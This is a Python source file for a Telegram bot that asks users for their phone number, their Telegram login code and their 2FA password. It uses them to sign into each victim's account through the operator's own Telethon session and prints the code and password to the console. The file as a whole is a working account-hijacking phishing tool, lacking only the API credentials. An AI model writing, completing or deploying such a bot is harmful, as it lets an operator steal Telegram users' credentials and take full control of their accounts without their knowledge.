import logging
from telegram import Update
from telegram.ext import ApplicationBuilder, ConversationHandler, CommandHandler, MessageHandler, filters, CallbackContext

from telethon import TelegramClient
from telethon.sessions import StringSession
import asyncio

API_ID = 0
API_HASH = ""
TELEGRAM_BOT_TOKEN = ""
client = TelegramClient("Test", API_ID, API_HASH)

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s")
logger = logging.getLogger()

phone_code_hash = None
entered_phone = None
code = None

async def login(phone, code, phone_code_hash):
    try:
        await client.sign_in(phone, code=code, phone_code_hash=phone_code_hash)
        return 1
    except Exception as e:
        print(f"2FA enabled {phone}: {e}")
        return 0
        
    
async def login_2fa(phone, password):
    try:
        await client.sign_in(phone, password=password)
        return 1
    except Exception as e:
        print(f"2FA login failed {phone}: {e}")
        return 0

async def handle_password(update: Update, context: CallbackContext):
    global password
    password = update.message.text
    print(password)
    login_status = await login_2fa(entered_phone, password)
    if login_status == 0:
        await update.message.reply_text("Wrong password. Please send your password again.")
        return 5
    else:
        await update.message.reply_text("Logged in with 2FA!")

async def request_phone(update: Update, context: CallbackContext):
    await update.message.reply_text("Please send your phone number.")
    return 2

async def handle_phone(update: Update, context: CallbackContext):
    global entered_phone, phone_code_hash
    entered_phone = update.message.text
    await client.connect()
    phone_code = await client.send_code_request(entered_phone)
    phone_code_hash = phone_code.phone_code_hash
    await update.message.reply_text("Enter the received code.")
    return 3

async def handle_code(update: Update, context: CallbackContext):
    global code
    code = update.message.text
    print(code)
    login_status = await login(entered_phone, code, phone_code_hash)
    if login_status == 0:
        await update.message.reply_text("2FA enabled. Please send your password.")
        return 5
    else:
        await update.message.reply_text("Logged in!")
        return ConversationHandler.END

def main():

    application = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", request_phone)],
        states={
            2: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone)],
            3: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_code)],
            5: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_password)],
        },
        fallbacks=[CommandHandler("start", request_phone)],
    )

    application.add_handler(conv_handler)
    application.run_polling()


if __name__ == "__main__":
    main()